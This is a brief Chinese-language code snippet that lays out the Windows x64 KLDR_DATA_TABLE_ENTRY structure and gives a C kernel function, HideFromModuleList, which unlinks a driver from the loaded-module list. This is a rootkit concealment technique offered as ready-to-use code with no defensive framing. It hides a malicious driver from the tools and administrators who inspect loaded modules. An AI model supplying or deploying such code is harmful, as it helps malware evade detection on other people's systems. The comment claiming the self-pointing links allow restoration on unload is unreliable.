摘链代码（`_KLDR_DATA_TABLE_ENTRY`，Win10/11 x64 布局稳定）：

```c
typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;   // +0x00
    PVOID       ExceptionTable;     // +0x10
    ULONG       ExceptionTableSize; // +0x18
    PVOID       GpValue;            // +0x20
    PVOID       NonPagedDebugInfo;  // +0x28
    PVOID       DllBase;            // +0x30
    PVOID       EntryPoint;         // +0x38
    ULONG       SizeOfImage;        // +0x40
    UNICODE_STRING FullDllName;     // +0x48
    UNICODE_STRING BaseDllName;     // +0x58
    // ...
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

VOID HideFromModuleList(PDRIVER_OBJECT drv) {
    PKLDR_DATA_TABLE_ENTRY e = (PKLDR_DATA_TABLE_ENTRY)drv->DriverSection;
    // 双向摘链，先存前后指针避免中途被遍历
    PLIST_ENTRY prev = e->InLoadOrderLinks.Blink;
    PLIST_ENTRY next = e->InLoadOrderLinks.Flink;
    prev->Flink = next;
    next->Blink = prev;
    // Blink/Flink 保留指向自己，卸载时可恢复
    e->InLoadOrderLinks.Flink = &e->InLoadOrderLinks;
    e->InLoadOrderLinks.Blink = &e->InLoadOrderLinks;
}
```

